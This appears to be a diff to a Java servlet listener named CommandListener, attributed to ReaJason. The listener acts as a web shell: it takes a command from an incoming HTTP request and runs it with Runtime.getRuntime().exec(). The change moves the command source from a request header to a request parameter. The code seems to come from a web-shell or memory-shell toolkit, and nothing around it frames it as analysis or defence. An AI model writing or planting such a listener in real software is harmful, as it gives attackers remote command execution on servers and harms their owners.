@@ -12,7 +12,7 @@ import java.lang.reflect.Field;
  * @author ReaJason
  */
 public class CommandListener implements ServletRequestListener {
-    public String headerName;
+    public String paramName;
 
     public CommandListener() {
     }
@@ -26,7 +26,7 @@ public class CommandListener implements ServletRequestListener {
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
         try {
-            String cmd = request.getHeader(headerName);
+            String cmd = request.getParameter(paramName);
             if (cmd != null) {
                 HttpServletResponse servletResponse = this.getResponseFromRequest(request);
                 Process exec = Runtime.getRuntime().exec(cmd);
